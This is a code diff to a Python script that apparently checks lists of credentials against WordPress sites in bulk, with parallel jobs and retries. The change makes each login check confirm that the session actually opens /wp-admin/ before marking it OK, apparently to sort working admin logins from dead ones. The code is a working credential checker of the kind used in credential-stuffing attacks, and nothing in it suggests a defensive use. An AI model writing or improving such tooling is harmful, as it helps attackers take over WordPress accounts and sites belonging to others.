@@ -151,6 +151,13 @@ def live_auth_cookie(headers) -> bool:
     return False
 
 
+def read_body(resp, limit: int = 200000) -> str:
+    try:
+        return resp.read(limit).decode("utf-8", "replace").lower()
+    except (TimeoutError, OSError, ValueError):
+        return ""
+
+
 def fetch(jar, req, timeout):
     try:
         return opener().open(req, timeout=timeout)
@@ -199,7 +206,32 @@ def verify(cred: Cred, timeout: float) -> str:
     post_resp = fetch(jar, post_req, timeout)
     if post_resp is None:
         return "UNKNOWN"
-    return "OK" if live_auth_cookie(post_resp.headers) else "BAD"
+    if not live_auth_cookie(post_resp.headers):
+        return "BAD"
+    jar.extract_cookies(post_resp, post_req)  # carry the session into the check
+    # The cookie alone can still be stale or set on a bounced session; require
+    # the session to actually open wp-admin.
+    admin_req = urllib.request.Request(site + "/wp-admin/", headers={"User-Agent": UA})
+    with_jar_cookies(jar, admin_req, "")
+    admin_resp = fetch(jar, admin_req, timeout)
+    if admin_resp is None:
+        return "UNKNOWN"
+    code = getattr(admin_resp, "status", None) or getattr(admin_resp, "code", 0)
+    loc = (admin_resp.headers.get("Location") or "").lower()
+    if "wp-login" in loc:
+        return "BAD"
+    if code in (403, 404, 429, 500, 502, 503, 504):
+        return "UNKNOWN" if code in (429, 500, 502, 503, 504) else "BAD"
+    if 300 <= code < 400:
+        # Authenticated sessions may be bounced to the site root by plugins;
+        # only a bounce back to the login page proves the session is dead.
+        return "OK"
+    body = read_body(admin_resp)
+    if not body:
+        return "UNKNOWN"
+    if 'name="pwd"' in body:
+        return "BAD"
+    return "OK" if ('adminmenu' in body or "wpbody-content" in body or "wpadminbar" in body) else "UNKNOWN"
 
 
 def run(creds: list[Cred], jobs: int, timeout: float, retries: int) -> dict[int, str]:
